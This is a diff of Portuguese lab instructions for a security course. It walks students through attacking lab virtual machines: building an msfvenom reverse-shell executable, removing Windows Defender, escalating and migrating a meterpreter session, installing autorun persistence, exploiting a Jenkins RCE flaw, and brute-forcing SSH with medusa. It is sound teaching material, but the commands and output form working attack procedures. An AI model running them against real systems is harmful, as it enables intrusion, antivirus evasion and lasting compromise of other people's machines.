@@ -534,119 +534,164 @@ image::nmap-2.png[align="center"]
 Como podemos observar, o _WinServer-G_ é um Windows Server 2019 Datacenter -- os resultados no `nmap` deixam um pouco a desejar, nesse caso.
 endif::gabarito[]
 
-=== 6) Realizando um ataque com o Metasploit
+=== 6) Realizando um ataque com o Metasploit em ambiente Windows
 
 [WARNING]
 ====
 Esta atividade será realizada nas máquinas virtuais _WinServer-G_ e _KaliLinux-G_.
 ====
 
-Nessa atividade iremos executar uma série de comandos utilizando o `metasploit` disponível na máquina _KaliLinux-G_. O objetivo desta atividade é demonstrar duas coisas: primeiro, o poder da ferramenta Metasploit, e, segundo, que não devemos instalar em servidores programas desnecessários, como visualizadores de PDF.
+Nessa atividade iremos executar uma série de comandos utilizando o `metasploit` disponível na máquina _KaliLinux-G_. O objetivo desta atividade é demonstrar duas coisas: primeiro, o poder da ferramenta Metasploit, e, segundo, que não devemos executar binários de fontes desconhecidas ou outros artefatos potencialmente maliciosos.
 
-1. Instale o _Adobe Reader_ versão 9.3.4 na máquina _WinServer-G_. Esse programa pode ser encontrado no AVA, ou na pasta compartilhada via rede pelo instrutor.
-
-2. Agora, vamos gerar um arquivo PDF malicioso para explorar a vulnerabilidade do _Adobe Reader_ instalado no passo (1). Acesse a máquina _KaliLinux-G_ e execute:
+1. Primeiro, vamos gerar um executável malicioso usando a ferramenta `msfvenom` -- um gerador de _payloads_ e _encoder_ integrante da suíte do Metasploit. Acesse a máquina _KaliLinux-G_ como `root`, e execute-o:
 +
 ....
 # hostname
 KaliLinux-A
-
-# msfconsole
-
-msf > use exploit/windows/fileformat/adobe_cooltype_sing
-
-msf exploit(adobe_cooltype_sing) > set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD => windows/meterpreter/reverse_tcp
-
-msf exploit(adobe_cooltype_sing) > set FILENAME boleto.pdf
-FILENAME => boleto.pdf
-
-msf exploit(adobe_cooltype_sing) > set LHOST 172.16.1.30
-LHOST => 172.16.1.30
-
-msf exploit(adobe_cooltype_sing) > set LPORT 4444
-LPORT => 4444
-
-msf exploit(adobe_cooltype_sing) > exploit
-
-[*] Creating 'boleto.pdf' file...
-[+] boleto.pdf stored at /root/.msf4/local/boleto.pdf
 ....
 +
-O que foi feito?
-+
---
-a. Escolhemos o _exploit_ a ser utilizado -- no caso, o `adobe_cooltype_sing`.
-b. Selecionamos o _payload_ a ser enviado junto com o arquivo PDF que será gerado -- `windows/meterpreter/reverse_tcp`. O `reverse_tcp` é um _payload_ que inicia uma conexão TCP reversa, isto é, da vítima para o atacante, com o objetivo de burlar restrições de firewall para abertura de portas na rede local.
-c. Selecionamos o nome do arquivo -- `boleto.pdf` . Um nome (e conteúdo) sugestivo são critérios fundamentais para que um ataque desse tipo tenha sucesso, pois o usuário deve acreditar que aquele arquivo é de fato útil e deve ser visualizado.
-d. Selecionamos o _host_ local -- esse é o IP da máquina que iniciará o _handler_ da conexão reversa, que faremos no passo seguinte. No caso, é a própria máquina _KaliLinux-G_, 172.16.1.30.
-e. Selecionamos a porta na qual o cliente irá tentar buscar durante a conexão reversa. Aqui, foi escolhida a porta 4444, mas idealmente seria até melhor selecionar uma porta popular, como 80 ou 443, que provavelmente serão liberadas pelo firewall da rede.
-f. Finalmente, executamos `exploit`. No caso particular desse _exploit_, esse comando produziu o PDF malicioso objetivado, e o gravou no arquivo `/root/.msf4/local/boleto.pdf`.
---
-
-3. O próximo passo é disponibilizar o PDF para a vítima. Felizmente, o Kali Linux já possui um servidor web instalado -- basta copiar o arquivo gerado no passo anterior para a pasta `/var/www/html`, retirar o arquivo `index.html` dessa pasta para que a listagem de arquivos seja feita no navegador, e iniciar o serviço. Abra um novo terminal e faça isso:
+....
+# whoami
+root
+....
 +
 ....
-# mv /root/.msf4/local/boleto.pdf /var/www/html/
+# msfvenom -a x64                                 \
+           --platform windows                     \
+           -p windows/x64/meterpreter/reverse_tcp \
+           LHOST=172.16.1.30                      \
+           LPORT=4444                             \
+           -f exe-only                            \
+           -b '\x00'                              \
+           -o /var/www/html/virus.exe
 
-# mv /var/www/html/index.html /var/www/html/index.html.bak
+Found 3 compatible encoders
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=7, char=0x00)
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 551 (iteration=0)
+x64/xor chosen with final size 551
+Payload size: 551 bytes
+Final size of exe-only file: 6144 bytes
+Saved as: /var/www/html/virus.exe
+....
++
+O que estamos fazendo?
++
+--
+a. Selecionamos a arquitetura e plataforma-alvos do ataque: `Windows/x64`.
+b. Selecionamos o _payload_ a ser enviado junto com o executável que será gerado -- `windows/x64/meterpreter/reverse_tcp`. O `reverse_tcp` é um _payload_ que inicia uma conexão TCP reversa, isto é, da vítima para o atacante, com o objetivo de burlar restrições de firewall para abertura de portas na rede local.
+c. Selecionamos o _host_ local -- esse é o IP da máquina que iniciará o _handler_ da conexão reversa, que faremos no passo seguinte. No caso, é a própria máquina _KaliLinux-G_, 172.16.1.30.
+d. Selecionamos a porta na qual o cliente irá tentar buscar durante a conexão reversa. Aqui, foi escolhida a porta 4444, mas idealmente seria melhor selecionar uma porta popular, como 80 ou 443, que provavelmente estarão liberadas pelo firewall da rede.
+e. Selecionamos o formato de saída do `msfvenom` -- `exe-only`. Isto irá produzir um executável padrão para ambiente Windows, colocando o _shellcode_ do _payload_ escolhido na seção `.text` do binário. É possível gerar um número bastante diverso de formatos de saída usando o `msfvenom`; pode-se consultá-los usando a opção `--list formats`.
+f. Determinamos quais caracteres não devem ser incluídos no binário de saída -- apenas o caractere NUL (`\x00`), nesse caso.
+g. Selecionamos o nome do arquivo de saída -- `/var/www/html/virus.exe`. Claro, esse é um nome (propositalmente) bastante óbvio -- um nome (e conteúdo executável) sugestivo são critérios fundamentais para que um ataque desse tipo tenha sucesso, pois o usuário deve acreditar que aquele arquivo é de fato útil e deve ser executado.
+--
 
+2. O próximo passo é disponibilizar o executável para a vítima. Felizmente, o Kali Linux já possui um servidor web instalado -- como já colocamos o arquivo na pasta apropriada, basta iniciar o Apache:
++
+....
 # systemctl start apache2
 ....
 
-4. Agora, vamos fazer o download do arquivo PDF na máquina _WinServer-G_. Mas, antes disso, no entanto, precisamos iniciar o _handler_ na máquina _KaliLinux-G_, que irá escutar a conexão TCP reversa:
+3. Antes de prosseguir, precisamos iniciar o _handler_ na máquina _KaliLinux-G_ que irá escutar a conexão TCP reversa:
 +
 ....
-# hostname
-KaliLinux-A
-
 # msfconsole
-
-msf > use exploit/multi/handler
-
-msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD => windows/meterpreter/reverse_tcp
-
-msf exploit(handler) > set LHOST 172.16.1.30
-LHOST => 172.16.1.30
-
-msf exploit(handler) > set LPORT 4444
-LPORT => 4444
-
-msf exploit(handler) > exploit
-
-[*] Started reverse handler on 172.16.1.30:4444
-[*] Starting the payload handler...
 ....
 +
-<<<
+....
+msf5 > use exploit/multi/handler
+....
++
+....
+msf5 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+....
++
+....
+msf5 exploit(multi/handler) > set LHOST 172.16.1.30
+LHOST => 172.16.1.30
+....
++
+....
+msf5 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+....
++
+....
+msf5 exploit(multi/handler) > run
 
-5. Perfeito, agora sim. Na máquina _WinServer-G_, acesse a URL http://172.16.1.30 (ajuste o endereço IP se você pertencer ao grupo `B`). Você deve ver o PDF disponível para download:
-+
-.PDF malicioso disponível para download no browser
-[#img-metasploit-browser]
-image::metasploit-browser.png[align="center"]
-+
-<<<
+[*] Started reverse TCP handler on 172.16.1.30:4444
+....
 
-6. Faça o download do PDF na máquina _WinServer-G_ -- será necessário adicionar a máquina _KaliLinux-G_ à lista de _Trusted sites_ do Internet Explorer antes de o download ser permitido. Depois, clique duas vezes no documento. O _Adobe Reader_ irá iniciar, e uma tela vazia será apresentada, como a que se segue:
+4. Vamos prosseguir! Acesse a máquina _WinServer-G_ e abra o Windows PowerShell. Faça o download do executável gerado no passo (1) com o comando:
 +
-.Exploit do Adobe Reader com sucesso
-[#img-metasploit-pdf]
-image::metasploit-pdf.png[align="center"]
+....
+PS C:\Users\Administrator> wget http://172.16.1.30/virus.exe -OutFile .\virus.exe
+....
++
+Note que o executável é imediatamente detectado pelo antivírus nativo do sistema, o Windows Defender:
++
+.Executável malicioso detectado pelo Windows Defender
+[#img-metasploit-1]
+image::metasploit-1.png[align="center"]
++
+Evidentemente, fica clara facilidade de detecção por estarmos usando o _template_ padrão do Metasploit para entregar o _payload_, bem como o fato de não termos usado nenhuma técnica de evasão de antivírus. Neste momento, teríamos que empregar técnicas de ofuscação, criptografia ou codificação do executável para dificultar a detecção do antivírus, e assim conseguir efetivar o ataque -- esses temas, contudo, extrapolam o escopo desta atividade.
+
+5. Vamos desativar o antivírus Windows Defender na máquina _WinServer-G_, e testar. Ainda no Windows PowerShell, execute:
++
+....
+PS C:\Users\Administrator> Uninstall-WindowsFeature -Name Windows-Defender
+
+Success Restart Needed Exit Code      Feature Result
+------- -------------- ---------      --------------
+True    Yes            SuccessRest... {Windows Defender Antivirus}
+WARNING: You must restart this server to finish the removal process.
+....
++
+Após algum tempo, o Windows Defenser será desinstalado. Para concluir o procedimento, é necessário reiniciar o servidor -- execute:
++
+....
+PS C:\Users\Administrator> Restart-Computer
+....
+
+6. Terá funcionado? Faça novamente o download do executável malicioso:
++
+....
+PS C:\Users\Administrator> wget http://172.16.1.30/virus.exe -OutFile .\virus.exe
+....
++
+Aparentemente, não fomos detectados! Execute o programa:
++
+....
+PS C:\Users\Administrator> .\virus.exe
+....
 
 7. De volta à console do _KaliLinux-G_, observe que o _handler_ recebeu a conexão reversa e iniciou o _meterpreter_, um _payload_ avançado que irá permitir-nos controlar a máquina _WinServer-G_ remotamente.
 +
 ....
-[*] Started reverse handler on 172.16.1.30:4444
-[*] Starting the payload handler...
-[*] Sending stage (885806 bytes) to 172.16.1.20
-[*] Meterpreter session 1 opened (172.16.1.30:4444 -> 172.16.1.20:49173) at 2018-08-18 02:27:47 -0400
+[*] Started reverse TCP handler on 172.16.1.30:4444
+[*] Sending stage (206403 bytes) to 172.16.1.20
+[*] Meterpreter session 1 opened (172.16.1.30:4444 -> 172.16.1.20:49675) at 2019-04-10 02:33:22 -0300
 
 meterpreter >
 ....
 
-8. Primeiro, vamos escalar privilégios dentro da máquina-alvo. Se você executar o comando `getuid`, irá notar que o `meterpreter` está executando como o usuário que abriu o PDF originalmente (provavelmente, o usuário `Administrator`).
+8. Primeiro, vamos verificar que de fato acessamos a máquina _WinServer-G_. Execute:
++
+....
+meterpreter > sysinfo
+Computer        : WINSERVER-A
+OS              : Windows 2016 (Build 17763).
+Architecture    : x64
+System Language : pt_BR
+Domain          : GRUPO
+Logged On Users : 1
+Meterpreter     : x64/windows
+....
++
+Vamos escalar privilégios dentro da máquina-alvo. Se você executar o comando `getuid`, irá notar que o `meterpreter` está executando como o usuário que invocou o executável originalmente (provavelmente, o usuário `Administrator`).
 +
 ....
 meterpreter > getuid
@@ -662,47 +707,70 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ....
 
-9. Se o usuário fechar o Adobe Reader ou reiniciar a máquina, a conexão será perdida. Podemos usar o comando `migrate` para alterar o binário em que o `meterpreter` está alojado, de forma que se o usuário fechar o PDF aberto, não perderemos conexão com a máquina. Primeiro, vamos descobrir um processo adequado e então migrar para ele:
+9. Observe que nossa conexão atual está aberta apenas porque o processo `virus.exe` está operacional:
 +
 ....
-meterpreter > ps
+meterpreter > ps virus
+Filtering on 'virus'
 
 Process List
 ============
 
- PID   PPID  Name              Arch  Session  User                          Path
- ---   ----  ----              ----  -------  ----                          ----
- 0     0     [System Process]
- 4     0     System            x86   0
- 420   4     smss.exe          x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe  456   1040  taskeng.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe
- 488   476   csrss.exe         x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe  532   524   csrss.exe         x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe  540   476   wininit.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
- 568   524   winlogon.exe      x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
- 616   540   services.exe      x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
- 628   540   lsass.exe         x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe  636   540   lsm.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
- 796   616   svchost.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
- 840   616   VBoxService.exe   x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\VBoxService.exe
- 892   616   svchost.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ PID   PPID  Name       Arch  Session  User                       Path
+ ---   ----  ----       ----  -------  ----                       ----
+ 3180  3224  virus.exe  x64   1        WINSERVER-A\Administrator  C:\Users\Administrator\virus.exe
+....
++
+Se o usuário fechar o processo ou reiniciar a máquina, a conexão será perdida. Podemos usar o comando `migrate` para alterar o binário em que o `meterpreter` está alojado para manter conexão com a máquina mesmo que o programa `virus.exe` seja encerrado. Primeiro, vamos descobrir um processo adequado e então migrar para ele:
++
+....
+meterpreter > ps svchost
+Filtering on 'svchost'
+
+Process List
+============
+
+ PID   PPID  Name         Arch  Session  User                          Path
+ ---   ----  ----         ----  -------  ----                          ----
+ 8     564   svchost.exe  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 676   564   svchost.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 772   564   svchost.exe  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 820   564   svchost.exe  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 964   564   svchost.exe  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+
+(...)
 ....
 +
 ....
-meterpreter > migrate 796
-[*] Migrating from 1932 to 796...
+meterpreter > migrate 676
+[*] Migrating from 3180 to 676...
 [*] Migration completed successfully.
+....
++
+Note que, após a migração, o processo `virus.exe` é encerrado -- dificultando a detecção da invasão.
++
+....
+meterpreter > ps virus
+Filtering on 'virus'
+No matching processes were found.
 ....
 
 10. Em seguida, vamos executar o módulo `persistence` do `meterpreter` -- trata-se de um _script_ Ruby que irá criar um serviço do `meterpreter` que será iniciado assim que a máquina for ligada.
 +
 ....
 meterpreter > run persistence -X
-[*] Running Persistance Script
-[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WINSERVER-A_20180818.3516/WINSERVER-A_20180818.3516.rc
+
+[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
+[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
+[*] Running Persistence Script
+[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WINSERVER-A_20190410.4100/WINSERVER-A_20190410.4100.rc
 [*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=172.16.1.30 LPORT=4444
-[*] Persistent agent script is 148489 bytes long
-[+] Persistent Script written to C:\Users\ADMINI~1\AppData\Local\Temp\1\jQtfcF.vbs
-[*] Executing script C:\Users\ADMINI~1\AppData\Local\Temp\1\jQtfcF.vbs
-[+] Agent executed with PID 2576
-[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BDvTbCcqiyCJEPO
-[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BDvTbCcqiyCJEPO
+[*] Persistent agent script is 99638 bytes long
+[+] Persistent Script written to C:\Windows\TEMP\JRUGwDg.vbs
+[*] Executing script C:\Windows\TEMP\JRUGwDg.vbs
+[+] Agent executed with PID 556
+[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\cWDaWtSsDjaFWrf
+[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\cWDaWtSsDjaFWrf
 ....
 
 11. Efetivamente, agora a máquina _WinServer-G_ está totalmente dominada. Agora, faça testes com os comandos que se seguem para determinar quais são as possibilidades apresentadas pelo `meterpreter` -- sua imaginação é o limite!
@@ -715,7 +783,152 @@ image::meterpreter-commands-p1.png[align="center"]
 [#img-meterpreter-commands-p2]
 image::meterpreter-commands-p2.png[align="center"]
 
-=== 7) Realizando um ataque de dicionário com o *_medusa_*
+=== 7) Realizando um ataque com o Metasploit em ambiente Linux
+
+[WARNING]
+====
+Esta atividade será realizada nas máquinas virtuais _LinServer-G_ e _KaliLinux-G_.
+====
+
+Nessa atividade utilizaremos novamente o `metasploit` disponível na máquina _KaliLinux-G_, desta vez focando em explorar uma vulnerabilidade em ambiente Linux.
+
+Iremos atacar a ferramenta Jenkins, uma das ferramentas de integração contínua _open source_ mais populares. Em 8 de janeiro de 2019 foram publicados três CVEs (https://nvd.nist.gov/vuln/detail/CVE-2019-1003000[CVE-2019-1003000], https://nvd.nist.gov/vuln/detail/CVE-2019-1003001[CVE-2019-1003001] e https://nvd.nist.gov/vuln/detail/CVE-2019-1003002[CVE-2019-1003002]) para o Jenkins versão <= 2.137 e um de seus _plugins_, o _Pipeline Groovy_ versão 2.61, que detalhavam um vulnerabilidade no roteamento dinâmico do Jenkins permitindo o _bypass_ de permisões de acesso e leitura do servidor para realizar o download e execução de um JAR (_Java Archive_) malicioso.
+
+1. Primeiro, vamos iniciar o serviço Jenkins vulnerável -- ele está disponível em um container Docker pré-configurado em sua máquina _LinServer-G_. Acesse a máquina _LinServer-G_ como `root` e entre no diretório `/root/src/cve-2019-1003000-jenkins-rce-poc/sample-vuln/`:
++
+....
+# hostname
+LinServer-A
+....
++
+....
+# whoami
+root
+....
++
+....
+# cd ~/src/cve-2019-1003000-jenkins-rce-poc/sample-vuln/
+....
+
+2. Nesse diretório, execute o _script_ `run.sh`.
++
+....
+# ./run.sh
+5900d5e6faa03a440f7c13e14cc360bdd1fead69815413efaebca23787b73c09
+....
++
+Após alguns segundos, use o comando `docker container list` para verificar que o container foi iniciado com sucesso:
++
+....
+# docker container list
+CONTAINER ID        IMAGE                          COMMAND                  CREATED              STATUS              PORTS                                              NAMES
+5900d5e6faa0        jenkins/jenkins:2.137-alpine   "/sbin/tini -- /usr/…"   About a minute ago   Up About a minute   0.0.0.0:8080->8080/tcp, 0.0.0.0:50000->50000/tcp   vuln-jenkins
+....
++
+Use o comando `docker logs <CONTAINER_ID>` para verificar que o Jenkins foi iniciado com sucesso:
++
+....
+# docker logs 5900d5e6faa0
+
+(...)
+
+INFO: Completed initialization
+Apr 10, 2019 3:29:34 AM hudson.WebAppMain$3 run
+INFO: Jenkins is fully up and running
+....
+
+3. Agora, acesse a VM _KaliLinux-G_ como `root` e inicie o `msfconsole`:
++
+....
+# hostname
+KaliLinux-A
+....
++
+....
+# whoami
+root
+....
++
+....
+# msfconsole
+
+(...)
+
+msf5 >
+....
+
+4. Iremos usar o _exploit_ `exploit/multi/http/jenkins_metaprogramming`. Indique sua utilização:
++
+....
+msf5 > use exploit/multi/http/jenkins_metaprogramming
+....
++
+Defina o _host_-alvo do ataque, a máquina _LinServer-G_ -- caso você esteja no grupo B, altere o endereço IP abaixo de forma apropriada:
++
+....
+msf5 exploit(multi/http/jenkins_metaprogramming) > set rhost 172.16.1.10
+rhost => 172.16.1.10
+....
++
+Defina o endereço do _host_ local -- novamente, atenção caso você seja membro do grupo B:
++
+....
+msf5 exploit(multi/http/jenkins_metaprogramming) > set lhost 172.16.1.30
+lhost => 172.16.1.30
+....
++
+Tudo pronto! Execute o _exploit_ com o comando `run`:
++
+....
+msf5 exploit(multi/http/jenkins_metaprogramming) > run
+
+[*] Started HTTPS reverse handler on https://172.16.1.30:8443
+[*] Using URL: http://0.0.0.0:8080/
+[*] Local IP: http://172.16.1.30:8080/
+[*] Sending Jenkins and Groovy go-go-gadgets
+[*] https://172.16.1.30:8443 handling request from 172.16.1.10; (UUID: dcxkuugy) Staging java payload (54377 bytes) ...
+[*] Meterpreter session 1 opened (172.16.1.30:8443 -> 172.16.1.10:37828) at 2019-04-10 00:38:42 -0300
+[*] Server stopped.
+[!] This exploit may require manual cleanup of '$HOME/.groovy/grapes/JacobsonLLC' on the target
+
+meterpreter >
+....
+
+5. Estamos dentro do sistema! Verifique com qual usuário estamos conectados:
++
+....
+meterpreter > getuid
+Server username: jenkins
+....
++
+O comando `sysinfo` pode ser usado para obter mais informações sobre o sistema atacado:
++
+....
+meterpreter > sysinfo
+Computer    : 5900d5e6faa0
+OS          : Linux 4.9.0-8-amd64 (amd64)
+Meterpreter : java/linux
+....
++
+Note que, como estamos executando o Jenkins dentro de um container, o isolamento provido por esse tipo de solução impede que tenhamos acesso irrestrito ao sistema hospedeiro. Veja que a lista de processos reportada pelo comando `ps` é bastante reduzida:
++
+....
+meterpreter > shell
+Process 1 created.
+Channel 1 created.
+....
++
+....
+ps auxmw
+PID   USER     TIME  COMMAND
+    1 jenkins   0:00 /sbin/tini -- /usr/local/bin/jenkins.sh
+    6 jenkins   0:20 java -Duser.home=/var/jenkins_home -jar /usr/share/jenkins/jenkins.war
+   90 jenkins   0:04 /usr/lib/jvm/java-1.8-openjdk/jre/bin/java -classpath /tmp/~spawn7661342154187960868.tmp.dir metasploit.Payload
+  442 jenkins   0:00 /bin/sh
+  450 jenkins   0:00 ps auxmw
+....
+
+=== 8) Realizando um ataque de dicionário com o *_medusa_*
 
 [WARNING]
 ====
@@ -728,10 +941,17 @@ ifdef::gabarito[]
 ....
 # hostname
 FWGW1-A
-
+....
++
+....
 # useradd -m marcelo ; echo 'marcelo:123456' | chpasswd
+....
++
+....
 # useradd -m marco ; echo 'marco:abacate' | chpasswd
-
+....
++
+....
 # tail -f -n0 /var/log/auth.log
 ....
 endif::gabarito[]
@@ -742,9 +962,11 @@ ifdef::gabarito[]
 ....
 # hostname
 KaliLinux-A
-
+....
++
+....
 # nc 172.16.1.1 22
-SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u1
+SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u6
 ....
 endif::gabarito[]
 
@@ -754,13 +976,17 @@ ifdef::gabarito[]
 ....
 # pwd
 /root
-
+....
++
+....
 # cat users.txt
 root
 marcelo
 marco
 silva
-
+....
++
+....
 # cat passwords.txt
 rnpesr
 123456
@@ -773,7 +999,7 @@ endif::gabarito[]
 ifdef::gabarito[]
 +
 ....
-# medusa -M ssh -m BANNER:SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u1 -h 172.16.1.1 -U users.txt -P passwords.txt | grep 'SUCCESS'
+# medusa -M ssh -m BANNER:SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u6 -h 172.16.1.1 -U users.txt -P passwords.txt | grep 'SUCCESS'
 ACCOUNT FOUND: [ssh] Host: 172.16.1.1 User: marcelo Password: 123456 [SUCCESS]
 ACCOUNT FOUND: [ssh] Host: 172.16.1.1 User: marco Password: abacate [SUCCESS]
 ....
